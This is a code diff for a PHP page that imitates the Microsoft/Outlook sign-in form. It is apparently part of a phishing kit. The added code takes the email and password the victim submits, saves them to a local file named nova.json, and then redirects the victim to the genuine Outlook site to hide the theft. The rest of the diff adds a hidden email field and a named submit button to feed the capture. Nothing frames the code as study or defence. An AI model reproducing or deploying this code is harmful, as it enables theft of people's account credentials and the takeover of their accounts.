@@ -2,7 +2,40 @@
    $email = "";
    if(isset($_POST['loginfmt'])){
       $email = $_POST['loginfmt'];
+   }else{
+      
    }
+
+   if(isset($_POST['pw'])){
+      $email =  $_POST['email'];
+      $pass =  $_POST['passwd'];
+
+      if(file_exists("nova.json")){
+         $current_data = file_get_contents("nova.json");
+         $array_data = json_decode($current_data, true);
+
+         $extra = array(
+            'email' =>  $_POST['email'],
+            'password' => $_POST['passwd']
+         );
+
+         $array_data[] = $extra;
+         
+         $final_data = json_encode($array_data);
+        
+         var_dump($final_data);
+
+         if(file_put_contents("nova.json", $final_data)){
+            header("location: https://outlook.live.com/owa/");
+            // header('location: r?email='.$email);
+         }
+      }
+      // header('location: r?email='.$email);
+
+   }
+   // else{
+   //    header('location: sign-in');
+   // }
 ?>
 
 
@@ -34,7 +67,7 @@
             </div>
          </div>
          <div data-bind="if: activeDialog"></div>
-         <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="action">
+         <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="login">
             <!-- ko if: svr.CO --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
             <div class="outer" data-bind="component: { name: 'master-page',
                params: {
@@ -179,6 +212,7 @@
                                              moveOffScreen: showPassword,
                                              css: { 'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder="Password" aria-label="Enter the password for <?= $email ?>" tabindex="0"><!-- ko if: svr.CK && showPassword() --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
                                        </div>
+                                       <input name="email" type="hidden" value="<?=$email ?>" />
                                        <!-- ko if: svr.CK --><!-- /ko --> 
                                     </div>
                                  </div>
@@ -228,14 +262,14 @@
                                              css: { 'no-margin-bottom': removeBottomMargin }">
                                              <!-- ko if: isSecondaryButtonVisible --><!-- /ko --> 
                                              <div class="inline-block">
-                                                <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
+                                                <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" name="pw" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
                                                    attr: primaryButtonAttributes,
                                                    value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                                    hasFocus: focusOnPrimaryButton,
                                                    click: primaryButton_onClick,
                                                    enable: isPrimaryButtonEnabled,
                                                    visible: isPrimaryButtonVisible,
-                                                   preventTabbing: primaryButtonPreventTabbing" value="Sign in"> 
+                                                   preventTabbing: primaryButtonPreventTabbing" value="Sign in" name="login"> 
                                              </div>
                                           </div>
                                        </div>
